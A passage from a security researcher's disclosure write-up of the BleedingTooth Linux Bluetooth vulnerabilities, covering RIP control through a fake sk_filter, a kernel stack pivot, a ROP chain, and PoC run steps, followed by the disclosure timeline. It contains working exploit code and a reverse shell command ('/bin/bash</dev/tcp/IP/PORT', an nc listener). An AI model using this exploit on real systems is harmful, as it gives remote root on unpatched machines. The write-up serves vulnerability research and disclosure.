<span class="kt">int</span> <span class="nf">sk_filter_trim_cap</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cap</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span>
	<span class="n">rcu_read_lock</span><span class="p">();</span>
	<span class="n">filter</span> <span class="o">=</span> <span class="n">rcu_dereference</span><span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_filter</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">save_sk</span> <span class="o">=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span>
		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">pkt_len</span><span class="p">;</span>

		<span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">;</span>
		<span class="n">pkt_len</span> <span class="o">=</span> <span class="n">bpf_prog_run_save_cb</span><span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
		<span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span> <span class="o">=</span> <span class="n">save_sk</span><span class="p">;</span>
		<span class="n">err</span> <span class="o">=</span> <span class="n">pkt_len</span> <span class="o">?</span> <span class="n">pskb_trim</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">max</span><span class="p">(</span><span class="n">cap</span><span class="p">,</span> <span class="n">pkt_len</span><span class="p">))</span> <span class="o">:</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">rcu_read_unlock</span><span class="p">();</span>

	<span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Since we control the value of <code class="language-plaintext highlighter-rouge">filter</code>, we can also control <code class="language-plaintext highlighter-rouge">filter-&gt;prog</code> by placing a pointer at offset 0x18 in our payload. Namely, this is the offset of <code class="language-plaintext highlighter-rouge">prog</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// pahole -E -C sk_filter --hex bluetooth.ko</span>
<span class="k">struct</span> <span class="n">sk_filter</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span>          <span class="n">prog</span><span class="p">;</span>                                                 <span class="cm">/*  0x18   0x8 */</span>

	<span class="cm">/* size: 32, cachelines: 1, members: 3 */</span>
	<span class="cm">/* sum members: 28, holes: 1, sum holes: 4 */</span>
	<span class="cm">/* forced alignments: 1, forced holes: 1, sum forced holes: 4 */</span>
	<span class="cm">/* last cacheline: 32 bytes */</span>
<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__aligned__</span><span class="p">(</span><span class="mi">8</span><span class="p">)));</span>
</code></pre></div></div>

<p>Here, the structure of <code class="language-plaintext highlighter-rouge">struct buf_prog</code> is:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// pahole -E -C bpf_prog --hex bluetooth.ko</span>
<span class="k">struct</span> <span class="n">bpf_prog</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="kt">unsigned</span> <span class="kt">int</span>               <span class="p">(</span><span class="o">*</span><span class="n">bpf_func</span><span class="p">)(</span><span class="k">const</span> <span class="kt">void</span>  <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span>  <span class="o">*</span><span class="p">);</span> <span class="cm">/*  0x30   0x8 */</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="p">...</span>
		<span class="k">struct</span> <span class="n">bpf_insn</span> <span class="p">{</span>
			<span class="cm">/* typedef __u8 */</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">;</span>                           <span class="cm">/*  0x38   0x1 */</span>
			<span class="cm">/* typedef __u8 */</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">dst_reg</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span>                      <span class="cm">/*  0x39: 0 0x1 */</span>
			<span class="cm">/* typedef __u8 */</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">src_reg</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span>                      <span class="cm">/*  0x39:0x4 0x1 */</span>
			<span class="cm">/* typedef __s16 */</span> <span class="kt">short</span> <span class="kt">int</span>  <span class="n">off</span><span class="p">;</span>                              <span class="cm">/*  0x3a   0x2 */</span>
			<span class="cm">/* typedef __s32 */</span> <span class="kt">int</span>        <span class="n">imm</span><span class="p">;</span>                              <span class="cm">/*  0x3c   0x4 */</span>
		<span class="p">}</span> <span class="n">insnsi</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="cm">/*  0x38     0 */</span>
	<span class="p">};</span>                                                                               <span class="cm">/*  0x38     0 */</span>

	<span class="cm">/* size: 56, cachelines: 1, members: 20 */</span>
	<span class="cm">/* sum members: 50, holes: 1, sum holes: 4 */</span>
	<span class="cm">/* sum bitfield members: 10 bits, bit holes: 1, sum bit holes: 6 bits */</span>
	<span class="cm">/* last cacheline: 56 bytes */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The function <code class="language-plaintext highlighter-rouge">bpf_prog_run_save_cb()</code> then passes <code class="language-plaintext highlighter-rouge">filter-&gt;prog</code> to <code class="language-plaintext highlighter-rouge">BPF_PROG_RUN()</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="n">u32</span> <span class="nf">__bpf_prog_run_save_cb</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="n">prog</span><span class="p">,</span>
					 <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span>
	<span class="n">res</span> <span class="o">=</span> <span class="n">BPF_PROG_RUN</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
	<span class="p">...</span>
	<span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">u32</span> <span class="nf">bpf_prog_run_save_cb</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="n">prog</span><span class="p">,</span>
				       <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">u32</span> <span class="n">res</span><span class="p">;</span>

	<span class="n">migrate_disable</span><span class="p">();</span>
	<span class="n">res</span> <span class="o">=</span> <span class="n">__bpf_prog_run_save_cb</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
	<span class="n">migrate_enable</span><span class="p">();</span>
	<span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>That in turn calls <code class="language-plaintext highlighter-rouge">bpf_dispatcher_nop_func()</code> with <code class="language-plaintext highlighter-rouge">ctx</code>, <code class="language-plaintext highlighter-rouge">prog-&gt;insnsi</code> and <code class="language-plaintext highlighter-rouge">prog-&gt;bpf_func()</code> as parameters:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h</span>
<span class="cp">#define __BPF_PROG_RUN(prog, ctx, dfunc)	({			\
	u32 ret;							\
	cant_migrate();							\
	if (static_branch_unlikely(&amp;bpf_stats_enabled_key)) {		\
		...
</span>		<span class="n">ret</span> <span class="o">=</span> <span class="n">dfunc</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="p">(</span><span class="n">prog</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">insnsi</span><span class="p">,</span> <span class="p">(</span><span class="n">prog</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bpf_func</span><span class="p">);</span>	\
		<span class="p">...</span>
	<span class="err">}</span> <span class="k">else</span> <span class="p">{</span>							\
		<span class="n">ret</span> <span class="o">=</span> <span class="n">dfunc</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="p">(</span><span class="n">prog</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">insnsi</span><span class="p">,</span> <span class="p">(</span><span class="n">prog</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bpf_func</span><span class="p">);</span>	\
	<span class="p">}</span>								\
	<span class="n">ret</span><span class="p">;</span> <span class="err">}</span><span class="p">)</span>

<span class="cp">#define BPF_PROG_RUN(prog, ctx)						\
	__BPF_PROG_RUN(prog, ctx, bpf_dispatcher_nop_func)
</span></code></pre></div></div>

<p>Finally, the dispatcher calls the <code class="language-plaintext highlighter-rouge">prog-&gt;bpf_func()</code> handler with <code class="language-plaintext highlighter-rouge">ctx</code> and <code class="language-plaintext highlighter-rouge">prog-&gt;insnsi</code> as arguments:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf.h</span>
<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">bpf_dispatcher_nop_func</span><span class="p">(</span>
	<span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span>
	<span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insnsi</span><span class="p">,</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">bpf_func</span><span class="p">)(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">,</span>
				 <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="p">))</span>
<span class="p">{</span>
	<span class="k">return</span> <span class="n">bpf_func</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">insnsi</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>All in all, we have:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">bpf_func</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="o">-&gt;</span><span class="n">insnsi</span><span class="p">);</span>
</code></pre></div></div>

<p>As we have control over <code class="language-plaintext highlighter-rouge">sk-&gt;sk_filter</code>, we also have control over the two later dereferences. This ultimately gives us RIP control with the RSI register (second argument) pointing to our payload.</p>

<h4 id="kernel-stack-pivoting">Kernel Stack Pivoting<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#kernel-stack-pivoting" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h4>

<p>Since modern CPUs have NX, it is not possible to directly execute shellcodes. However, we can perform a code-reuse attack such as ROP/JOP. Of course, in order to reuse code, we must know where it is located, which is why the KASLR bypass is essential. Regarding the possible attacks, ROP is normally easier to perform than JOP, but that requires us to redirect the stack pointer RSP. For this reason, exploit developers usually perform JOP to stack pivot and then finish with a ROP chain.</p>

<p>The idea is to redirect the stack pointer to a fake stack in our payload consisting of ROP gadgets, i.e. our ROP chain. Since we know that RSI points to our payload, we want to move the value of RSI to RSP. Let’s see if there is a gadget that allows us to do so.</p>

<p>To extract the gadgets, we can use the following tools:</p>

<ul>
  <li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/extract-vmlinux">extract-vmlinux</a> to decompress <code class="language-plaintext highlighter-rouge">/boot/vmlinuz</code>.</li>
  <li><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to extract ROP gadgets from <code class="language-plaintext highlighter-rouge">vmlinux</code>.</li>
</ul>

<p>Looking for gadgets like <code class="language-plaintext highlighter-rouge">mov rsp, X ; ret</code>, we can see that none of them are useful.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>gadgets.txt | <span class="nb">grep</span> <span class="s2">": mov rsp.*ret"</span>
0xffffffff8109410c : mov rsp, qword ptr <span class="o">[</span>rip + 0x15bb0fd] <span class="p">;</span> pop rbx <span class="p">;</span> pop rbp <span class="p">;</span> ret
0xffffffff810940c2 : mov rsp, qword ptr <span class="o">[</span>rsp] <span class="p">;</span> pop rbp <span class="p">;</span> ret
0xffffffff8108ef0c : mov rsp, rbp <span class="p">;</span> pop rbp <span class="p">;</span> ret
</code></pre></div></div>

<p>Maybe there is something like <code class="language-plaintext highlighter-rouge">push rsi ; pop rsp ; ret</code>?</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>gadgets.txt | <span class="nb">grep</span> <span class="s2">": push rsi.*pop rsp.*ret"</span>
0xffffffff81567f46 : push rsi <span class="p">;</span> adc al, 0x57 <span class="p">;</span> add byte ptr <span class="o">[</span>rbx + 0x41], bl <span class="p">;</span> pop rsp <span class="p">;</span> pop rbp <span class="p">;</span> ret
0xffffffff8156a128 : push rsi <span class="p">;</span> add byte ptr <span class="o">[</span>rbx + 0x41], bl <span class="p">;</span> pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop rbp <span class="p">;</span> ret
0xffffffff81556cad : push rsi <span class="p">;</span> add byte ptr <span class="o">[</span>rbx + 0x41], bl <span class="p">;</span> pop rsp <span class="p">;</span> pop rbp <span class="p">;</span> ret
0xffffffff81c02ab5 : push rsi <span class="p">;</span> lcall <span class="o">[</span>rbx + 0x41] <span class="p">;</span> pop rsp <span class="p">;</span> pop rbp <span class="p">;</span> ret
0xffffffff8105e049 : push rsi <span class="p">;</span> sbb byte ptr <span class="o">[</span>rbx + 0x41], bl <span class="p">;</span> pop rsp <span class="p">;</span> pop rbp <span class="p">;</span> ret
0xffffffff81993887 : push rsi <span class="p">;</span> xchg eax, ecx <span class="p">;</span> lcall <span class="o">[</span>rbx + 0x41] <span class="p">;</span> pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop rbp <span class="p">;</span> ret
</code></pre></div></div>

<p>Perfect, there are lots of gadgets that can be used. Interestingly, all gadgets dereference RBX+0x41, which is most likely part of a commonly used instruction or sequence of instructions. To elaborate, as instructions can begin at any byte in x86, they can be interpreted differently based on the start byte. The dereference of RBX+0x41 may actually hinder us from using the gadgets – namely, if RBX does not contain a writable memory address at the execution of <code class="language-plaintext highlighter-rouge">bpf_func()</code>, we will simply hit a panic before we can execute our ROP chain. In our case, luckily, RBX points to the <code class="language-plaintext highlighter-rouge">struct amp_mgr</code> object and it does not really hurt if the byte at offset 0x41 gets changed.</p>

<p>When choosing the stack pivot gadget as a function pointer for <code class="language-plaintext highlighter-rouge">bpf_func()</code> and triggering it, the value of RSI will be pushed onto stack, then popped from stack and finally assigned to RSP. In other words, the stack pointer will point to our payload, and once the <code class="language-plaintext highlighter-rouge">RET</code> instruction is executed, our ROP chain will kick off.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">build_payload</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[</span><span class="mh">0x400</span><span class="p">])</span> <span class="p">{</span>
  <span class="c1">// Fake sk_filter object starting at offset 0x300.</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mh">0x318</span><span class="p">]</span> <span class="o">=</span> <span class="n">l2cap_chan_addr</span> <span class="o">+</span> <span class="mh">0x320</span><span class="p">;</span>  <span class="c1">// prog</span>

  <span class="c1">// Fake bpf_prog object starting at offset 0x320.</span>
  <span class="c1">// RBX points to the amp_mgr object.</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mh">0x350</span><span class="p">]</span> <span class="o">=</span>
      <span class="n">kaslr_offset</span> <span class="o">+</span>
      <span class="n">PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET</span><span class="p">;</span>  <span class="c1">// bpf_func</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mh">0x358</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xDEADBEEF</span><span class="p">;</span>                   <span class="c1">// rbp</span>

  <span class="c1">// Build kernel ROP chain that executes run_cmd() from kernel/reboot.c.</span>
  <span class="c1">// Note that when executing the ROP chain, the data below in memory will be</span>
  <span class="c1">// overwritten. Therefore, the argument should be located after the ROP chain.</span>
  <span class="n">build_krop_chain</span><span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mh">0x360</span><span class="p">],</span> <span class="n">l2cap_chan_addr</span> <span class="o">+</span> <span class="mh">0x3c0</span><span class="p">);</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mh">0x3c0</span><span class="p">],</span> <span class="n">remote_command</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>With that, we have finally achieved RCE. To debug our stack pivot and see if we were successful, we can set <code class="language-plaintext highlighter-rouge">*(uint64_t *)&amp;data[0x360]=0x41414141</code> and observe a controlled panic.</p>

<h4 id="kernel-rop-chain-execution">Kernel ROP Chain Execution<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#kernel-rop-chain-execution" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h4>

<p>Now, we can either write a big ROP chain that retrieves and executes a C payload, or a smaller one that allows us to run an arbitrary command. For the sake of the Proof-Of-Concept, we are already satisfied with a reverse shell, thus executing a command is enough for us. Inspired by the ROP chain described in the write-up <a href="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html">CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem</a>, we will build a chain that calls <code class="language-plaintext highlighter-rouge">run_cmd()</code> with <code class="language-plaintext highlighter-rouge">/bin/bash -c /bin/bash&lt;/dev/tcp/IP/PORT</code> to spawn a reverse shell, and finally calls <code class="language-plaintext highlighter-rouge">do_task_dead()</code> to stop the kernel thread. After that, Bluetooth will no longer work. In a more sophisticated exploit, we would resume the execution.</p>

<p>To determine offsets for both methods, we can simply inspect the live symbols on the victim’s machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo cat</span> /proc/kallsyms | <span class="nb">grep</span> <span class="s2">"run_cmd</span><span class="se">\|</span><span class="s2">do_task_dead"</span>
ffffffffab2ce470 t run_cmd
ffffffffab2dc260 T do_task_dead
</code></pre></div></div>

<p>Here, the KASLR slide is 0x2a200000 which can be calculated by grep’ing for the <code class="language-plaintext highlighter-rouge">_text</code> symbol and subtracting <code class="language-plaintext highlighter-rouge">0xffffffff81000000</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo cat</span> /proc/kallsyms | <span class="nb">grep</span> <span class="s2">"T _text"</span>
ffffffffab200000 T _text
</code></pre></div></div>

<p>Subtracting the slide from the two addresses from before yields:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define RUN_CMD 0xffffffff810ce470
#define DO_TASK_DEAD 0xffffffff810dc260
</span></code></pre></div></div>

<p>Finally, we can find gadgets for <code class="language-plaintext highlighter-rouge">pop rax ; ret</code>, <code class="language-plaintext highlighter-rouge">pop rdi ; ret</code> and <code class="language-plaintext highlighter-rouge">jmp rax</code> with ROPgadget and then we can construct the kernel ROP chain according to this example:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">build_krop_chain</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">rop</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">cmd_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">kaslr_offset</span> <span class="o">+</span> <span class="n">POP_RAX_RET</span><span class="p">;</span>
  <span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">kaslr_offset</span> <span class="o">+</span> <span class="n">RUN_CMD</span><span class="p">;</span>
  <span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">kaslr_offset</span> <span class="o">+</span> <span class="n">POP_RDI_RET</span><span class="p">;</span>
  <span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">cmd_addr</span><span class="p">;</span>
  <span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">kaslr_offset</span> <span class="o">+</span> <span class="n">JMP_RAX</span><span class="p">;</span>
  <span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">kaslr_offset</span> <span class="o">+</span> <span class="n">POP_RAX_RET</span><span class="p">;</span>
  <span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">kaslr_offset</span> <span class="o">+</span> <span class="n">DO_TASK_DEAD</span><span class="p">;</span>
  <span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">kaslr_offset</span> <span class="o">+</span> <span class="n">JMP_RAX</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This ROP chain should be placed at offset 0x40 within the fake <code class="language-plaintext highlighter-rouge">struct bpf_prog</code> object, and <code class="language-plaintext highlighter-rouge">cmd_addr</code> should point to the bash command planted in kernel memory. With everything at the right place, we can finally retrieve a root shell from the victim.</p>

<h2 id="proof-of-concept">Proof-Of-Concept<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#proof-of-concept" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2>

<p>The Proof-Of-Concept is available at <a href="https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth">https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth</a>.</p>

<p>Compile it using:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc <span class="nt">-o</span> exploit exploit.c <span class="nt">-lbluetooth</span>
</code></pre></div></div>

<p>and execute it as:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> ./exploit target_mac source_ip source_port
</code></pre></div></div>

<p>In another terminal, run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvp</span> 1337
<span class="nb">exec </span>bash <span class="nt">-i</span> 2&gt;&amp;0 1&gt;&amp;0
</code></pre></div></div>

<p>If successful, a calc can be spawned with:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">XAUTHORITY</span><span class="o">=</span>/run/user/1000/gdm/Xauthority
<span class="nb">export </span><span class="nv">DISPLAY</span><span class="o">=</span>:0
gnome-calculator
</code></pre></div></div>

<p>Occasionally, the victim may print <code class="language-plaintext highlighter-rouge">Bluetooth: Trailing bytes: 6 in sframe</code> in dmesg. This happens if the kmalloc-128 slab spray has not been successful. In that case, we need to repeat the exploit. As an anecdote regarding the name “BadKarma”, the <em>BadKarma</em> exploit occasionally managed to bail out early in <code class="language-plaintext highlighter-rouge">sk_filter()</code>, e.g. when the field <code class="language-plaintext highlighter-rouge">sk_filter</code> is 0, and proceed with executing the A2MP receive handler and sending back a A2MP response packet. Hilariously, when that happened, the victim’s machine did not panic – instead, the attacker’s machine would panic; because, as we learned earlier, the ERTM implementation used by the A2MP protocol would by design trigger a type confusion.</p>

<h2 id="timeline">Timeline<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#timeline" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2>

<p>2020-07-06 – <em>BadVibes</em> vulnerability discovered internally at Google<br>
2020-07-20 – <em>BadKarma</em> and <em>BadChoice</em> vulnerabilities discovered internally at Google<br>
2020-07-22 – Linus Torvalds reports independent discovery of the <em>BadVibes</em> vulnerability to BlueZ with a 7 day disclosure timeline<br>
2020-07-24 – Technical details on the three BleedingTooth vulnerabilities reported to <a href="http://www.bluez.org/development/credits/">BlueZ main developers</a> (Intel)<br>
2020-07-29 – Intel schedules a meeting for 2020-07-31 with Google<br>
2020-07-30 – <em>BadVibes</em> fix released<br>
2020-07-31 – Intel sets disclosure date to 2020-09-01, with a prior NDA’d disclosure coordinated by Intel. The informed parties are approved to disable BT_HS via kconfig given a non-security commit message<br>
2020-08-12 – Intel adjusts disclosure date to 2020-10-13 (90days from initial report)<br>
2020-09-25 – Intel commits patches to public <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/net/bluetooth?id=f19425641cb2572a33cb074d5e30283720bd4d22">bluetooth-next</a> branch<br>
2020-09-29 – Patches merged with <a href="https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/commit/net/bluetooth?id=2bd056f550808eaa2c34a14169c99f81ead083a7">5.10 linux-next branch</a>.<br>
2020-10-13 – Public disclosure of Intel’s advisory, followed by disclosure of Google advisories<br>
2020-10-14 – Intel corrects the recommended fixed version from 5.9 to the 5.10 kernel<br>
2020-10-15 – Intel removes kernel upgrade recommendation</p>

<h2 id="conclusion">Conclusion<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#conclusion" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2>

<p>The path from starting with zero knowledge to uncovering three vulnerabilities in the Bluetooth HCI protocol was strange and unexpected. When I first found the <em>BadVibes</em> vulnerability, I thought it was only triggerable by vulnerable/malicious Bluetooth chips, as the bug seemed too obvious. Since I did not have two programmable devices with Bluetooth 5, I could not verify if receiving such a large advertisement was even possible. Only after comparing the Linux Bluetooth stack with other implementations and reading the specifications, did I come to the conclusion that I had actually discovered my first RCE vulnerability, and I immediately went out to purchase another laptop (surprisingly, there are no trustworthy BT5 dongles on the market). Analyzing the overflow, it was soon clear that an additional information leak vulnerability was needed. Much faster than I thought it would take, I discovered <em>BadChoice</em> after just two days. While trying to trigger it, I uncovered the <em>BadKarma</em> vulnerability which I first deemed to be an unfortunate bug that would prevent the <em>BadChoice</em> vulnerability. It turned out that it was quite easy to bypass and that the bug was in truth yet another high severity security vulnerability. Researching the Linux Bluetooth stack and developing the RCE exploit was challenging but exciting, especially since it was my first time auditing and debugging the Linux kernel. I was happy that, as a result of this work, the decision was made to <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/net/bluetooth?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08">disable the Bluetooth High Speed feature by default</a> in order to reduce the attack surface, which also meant the removal of the powerful heap primitive. Moreover, I converted the knowledge gained from this research into <a href="https://github.com/google/syzkaller/commits?author=TheOfficialFloW">syzkaller contributions</a> which enabled fuzzing the <code class="language-plaintext highlighter-rouge">/dev/vhci</code> device and uncovered &gt;40 additional bugs. Although most of these bugs were unlikely to be exploitable, or even remotely triggerable, they allowed engineers to identify and fix other weaknesses (<a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b50dc237ac04d499ad4f3a92632470a9eb844f7d">Bluetooth: Fix null pointer dereference in hci_event_packet()</a>, <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=cafd472a10ff3bccd8afd25a69f20a491cd8d7b8">Bluetooth: Fix memory leak in read_adv_mon_features()</a> or <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=51c19bf3d5cfaa66571e4b88ba2a6f6295311101">Bluetooth: Fix slab-out-of-bounds read in hci_extended_inquiry_result_evt()</a>), and as such contributed to having a safer and more stable kernel.</p>

